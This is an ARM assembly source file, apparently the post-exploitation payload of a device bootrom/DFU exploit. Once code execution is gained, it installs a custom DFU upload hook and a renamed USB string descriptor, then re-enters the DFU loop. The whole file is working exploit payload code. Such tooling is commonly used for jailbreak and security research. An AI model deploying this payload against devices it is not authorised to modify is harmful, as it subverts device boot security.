@ Entry point of the post-exp - this is where we get to execute our own code
@ 
@ The algorithm is pretty simple:
@
@ 1. Relocate our custom DFU upload hook to somewhere safe (hopefully)
@ 2. Relocate our new custom USB name string descriptor
@ 3. Clear (or invalidate?) instruction cache
@ 4. Restore original gState
@ 5. Set the hook and the string descriptor
@ 6. Reset USB to make the name change
@ 7. Re-enter DFU loop

.syntax unified

.text

@ there used to be a pool of constants,
@ but now they are included by compiler

.global	_start
.arm
.type	_start, %function

_start:
    ldr r0, =BASE
    ldr r1, L_hook
    ldr r2, =_binary_hook_bin_size
    mov r7, r0
    add r6, r0, r2
    bl memcpy

    mov r0, r6
    ldr r1, L_new_name_desc
    ldr r2, =new_name_desc_len
    ldr r2, [r2]
    bl memcpy

    mov r0, #0x0
    mcr p15, 0, r0, c7, c5, 0

    ldr r0, =OLD_STATE
    ldr r1, =STATE_PTR
    str r0, [r1]

    @ setting the upload hook
    str r7, [r0, #0x1c]

    @ setting the USB name
    ldr r0, [r0, #0x80]
    str r6, [r0, #0x8]

    ldr r0, =usb_reset_core
    blx r0

    ldr r0, =usb_start
    bx r0

L_hook:
    .long _binary_hook_bin_start

L_new_name_desc:
    .long new_name_desc
